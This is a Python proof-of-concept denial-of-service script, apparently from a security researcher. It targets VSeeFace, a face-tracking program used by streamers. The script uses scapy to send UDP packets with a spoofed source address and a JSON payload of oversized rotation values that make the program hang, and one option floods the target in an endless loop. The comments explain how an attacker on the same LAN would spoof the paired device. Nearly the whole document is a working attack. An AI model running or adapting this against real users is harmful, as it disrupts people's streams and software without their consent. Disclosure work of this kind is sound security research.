# VSeeFace DoS by @giuseppesec

from scapy.all import *
import json
import random

# Because UDP is being used, an attacker could spoof the IP address of the paired device
# This makes weaponization of this script more feasible
# An attacker would need to be on the same LAN as a streamer, and sniff traffic to discern the IP addresses in use by VSeeFace and the paired device

TIEMPO = int(time.time())

# Values in x, y, and z keys the size of 10 digits or more are what causes the hang
# This is the smallest JSON payload that still causes VSeeFace to hang
DATA = {"Timestamp": TIEMPO, "Hotkey": -1, "FaceFound": True, 
     "Rotation":{"x": 9999999999,
        "y": 9999999999, "z": 9999999999}}

def replaceValue(obj):
    def decode_dict(a_dict):
        for key, value in a_dict.items():
            try:
                if a_dict[key] == 9999999999:
                    a_dict[key] = random.random()*5.0
            except AttributeError:
                pass
        return a_dict

    return json.loads(json.dumps(obj), object_hook=decode_dict)


while True:

    packetType = input("Select packet type:\n1) DoS packet\n2) Random packet\n3) Go wild\n")

    if packetType == "1":

        data = json.dumps(DATA)

        # Replace dst with destination IP (the IP running VSeeFace)
        # Replace src with the IP of the device paired with VSeeFace 
        ip = IP(dst='192.168.122.225', src='192.168.122.251')
        udp = UDP(sport=51731, dport=50506)
        packet = ip/udp/data
        send(packet)
    elif packetType == '2':

        data = json.dumps(replaceValue(DATA))
        

        # Replace dst with destination IP (the IP running VSeeFace)
        # Replace src with the IP of the device paired with VSeeFace
        ip = IP(dst='192.168.122.225', src='192.168.122.251')
        udp = UDP(sport=51731, dport=50506)
        packet = ip/udp/data
        send(packet)
    elif packetType == "3":
        while True:
            data = json.dumps(replaceValue(DATA))

            
            # Replace dst with destination IP (the IP running VSeeFace)
            # Replace src with the IP of the device paired with VSeeFace
            ip = IP(dst='192.168.122.225', src='192.168.122.251')
            udp = UDP(sport=51731, dport=50506)
            packet = ip/udp/data
            send(packet, verbose=False)

    else:
        break
